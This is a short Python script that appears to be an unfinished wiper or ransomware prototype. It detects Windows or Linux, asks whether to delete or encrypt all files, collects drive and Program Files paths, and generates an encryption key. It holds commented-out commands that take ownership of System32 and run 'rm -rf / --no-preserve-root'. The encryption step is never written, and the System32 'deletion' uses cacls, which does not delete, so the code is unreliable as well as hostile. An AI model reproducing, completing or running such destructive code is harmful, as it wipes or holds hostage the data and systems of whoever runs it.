import os
import subprocess
import platform
from cryptography.fernet import Fernet
import re
from string import ascii_uppercase

def get_available_windrives():
    drives = []
    for drive in ascii_uppercase:
        if os.path.exists(os.path.join(str(drive) + ":\\")):
            drives.append(str(drive) + ":\\")

    for i, drive in enumerate(drives):
        if(drive in os.getenv('windir') and not drive == ''):
            progf86_path = drive + 'Program Files (x86)\\' 
            progf_path = drive + 'Program Files\\'

            drives.append(progf86_path)
            drives.append(progf_path)
            drives.pop(i)
    
    return drives


if(platform.system() == 'Windows'):
    print("Windows OS discovered. Getting System32's path...")
    delenc_choice = input('Del/Enc all files? ').lower()
    sys32_path = os.path.join(os.getenv("windir"), "System32")
    
    if(delenc_choice == 'del'):
        print('Starting deletion process...')

        # print('Taking ownership of System32...')
        # subprocess.run(['takeown', r'/f', sys32_path])
        # print('Deleting System32...')
        # subprocess.run(['cacls', sys32_path])
        # print('Done')


    if(delenc_choice == 'enc'):
        print('Starting Encryption process...')

        key = Fernet.generate_key()
        keyfunc = Fernet(key)

        drives_list = get_available_windrives()
        print(drives_list)


        
        



        

if(platform.system() == 'Linux'):
    print('Linux OS discovered.')

    # print('Deleting root...')
    # subprocess.run(['rm', '-rf', r'/', '--no-preserve-root'])
    # print('Done.')
